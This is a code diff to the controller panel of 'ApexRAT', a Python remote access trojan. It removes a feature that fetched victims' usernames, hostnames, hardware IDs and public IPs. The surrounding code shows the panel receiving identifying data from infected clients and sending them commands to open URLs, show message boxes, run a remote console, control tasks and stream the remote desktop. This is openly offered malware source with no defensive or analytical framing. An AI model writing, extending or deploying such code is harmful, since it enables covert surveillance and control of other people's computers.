@@ -2,7 +2,7 @@
 import tkinter as tk
 from tkinter import ttk
 from tkinter import Listbox, Menu
-import customtkinter as ct
+from customtkinter import CTkInputDialog, CTkButton
 import socket
 import threading
 from vidstream import StreamingServer
@@ -137,7 +137,7 @@ def handle_client(client_socket, client_address):
     data = client_socket.recv(1024).decode().split("|")
     build, username, hwid, os_version = [value.replace('ap3x', '') for value in data]
     if username == "3verlaster":
-        client_data = (build, client_address[0], username, "hidden/developer", os_version) # *for developer privacy
+        client_data = (build, client_address[0], username, "hidden/developer", os_version) # *for screenshot privacy
     else:
         client_data = (build, client_address[0], username, hwid, os_version)
 
@@ -179,29 +179,6 @@ def handle_client(client_socket, client_address):
                     output_text.see(tk.END) # scroll to last line (**see)
                 except Exception as e:
                     print(e)
-            elif data.startswith("Ap3x1nfo:"):
-                ## print(data) //
-                command, c_username, c_hostname, c_os_version, c_build, c_hwid, c_public_ip = data.split("::")
-                try:
-                    def info_window():
-                        info_window_tk = ct.CTkToplevel(root)
-                        info_window_tk.title(f"ApexRAT: Client Info - {c_hostname}@{c_username}")
-                        info_window_tk.geometry("550x320")
-                        try:
-                            info_window_tk.iconbitmap("assets/apex.ico")
-                        except:
-                            pass
-                        tk.Label(info_window_tk, text=f"OS: {c_os_version}", font='Verdana 9').pack(pady=2)
-                        tk.Label(info_window_tk, text=f"Build: {c_build}", font='Verdana 9').pack(pady=2)
-                        tk.Label(info_window_tk, text=f"Username: {c_username}", font='Verdana 15').pack(pady=2)
-                        tk.Label(info_window_tk, text=f"Hostname: {c_hostname}", font='Verdana 15').pack(pady=2)
-                        tk.Label(info_window_tk, text=f"HWID: {c_hwid}", font='Verdana 15').pack(pady=2)
-                        tk.Label(info_window_tk, text=f"Public IP: {c_public_ip}", font='Verdana 15').pack(pady=2)
-
-                    info_thread = threading.Thread(target=info_window)
-                    info_thread.start()
-                except Exception as e:
-                    print(e)
             elif data == "ap3x": #ping
                 #print("[DEBUG]: ap3x")
                 pass
@@ -241,7 +218,7 @@ def open_url(selected_client_index):
         client_socket = list(client_sockets.keys())[selected_client_index]
         curr_user = client_sockets[client_socket]['username']
         curr_user_ip = client_sockets[client_socket]['ip']
-        url_window = ct.CTkInputDialog(text="Type in a URL", title=f"Apex RAT | {curr_user_ip}@{curr_user} | Open URL")
+        url_window = CTkInputDialog(text="Type in a URL", title=f"Apex RAT | {curr_user_ip}@{curr_user} | Open URL")
         url = url_window.get_input()
         if url.startswith("http://") or url.startswith("https://"):
             send_command_to_client(client_socket, f"URLop3n_ap3x::{url}")
@@ -253,7 +230,7 @@ def send_message_box(selected_client_index):
         client_socket = list(client_sockets.keys())[selected_client_index]
         curr_user = client_sockets[client_socket]['username']
         curr_user_ip = client_sockets[client_socket]['ip']
-        message_box_window = ct.CTkInputDialog(text="Type in a text", title=f"Apex RAT | {curr_user_ip}@{curr_user} | MessageBox")
+        message_box_window = CTkInputDialog(text="Type in a text", title=f"Apex RAT | {curr_user_ip}@{curr_user} | MessageBox")
         box_text = message_box_window.get_input()
         #print(box_text)
         send_command_to_client(client_socket, f"Ap3x_MessageBox::{box_text}")
@@ -319,16 +296,9 @@ def client_cmd(selected_client_index):
             send_button.pack(side=tk.RIGHT, pady=2)
             console.bind("<Return>", lambda event=None: send_command())
 
+            #console.mainloop()
         console_thread = threading.Thread(target=console_window)
         console_thread.start()
-
-def client_info(selected_client_index):
-    if 0 <= selected_client_index < len(client_sockets):
-        client_socket = list(client_sockets.keys())[selected_client_index]
-        curr_user = client_sockets[client_socket]['username']
-        curr_user_ip = client_sockets[client_socket]['ip']
-        send_command_to_client(client_socket, "Ap3x1nfo")
-
 
 
 def watch_remote_desktop(selected_client_index):
@@ -370,10 +340,6 @@ def client_context_menu(event):
         remote_desktop_stop_icon = Image.open("assets/images/context_menu/remote_desktop_menu/remote_desktop_stop_icon.png")
         remote_desktop_stop_icon = remote_desktop_stop_icon.resize((16, 16))
         remote_desktop_stop_icon = ImageTk.PhotoImage(remote_desktop_stop_icon)
-
-        client_info_icon = Image.open("assets/images/context_menu/info_icon.png")
-        client_info_icon = client_info_icon.resize((16, 16))
-        client_info_icon = ImageTk.PhotoImage(client_info_icon)
 
         open_url_icon = Image.open("assets/images/context_menu/open_url_icon.png")
         open_url_icon = open_url_icon.resize((16, 16))
@@ -434,7 +400,6 @@ def client_context_menu(event):
         client_menu.add_command(label="MessageBox", image=messagebox_icon, compound="left", command=lambda: send_message_box(selected_client_index))
         client_menu.add_cascade(label="Task Manager", menu=task_manager_menu, image=task_manager_icon, compound="left")
         client_menu.add_cascade(label="Client", menu=client_management_menu, image=client_icon, compound="left")
-        client_menu.add_command(label="Client Info", image=client_info_icon, compound="left", command=lambda: client_info(selected_client_index))
         client_menu.post(event.x_root, event.y_root)
     except:
         pass
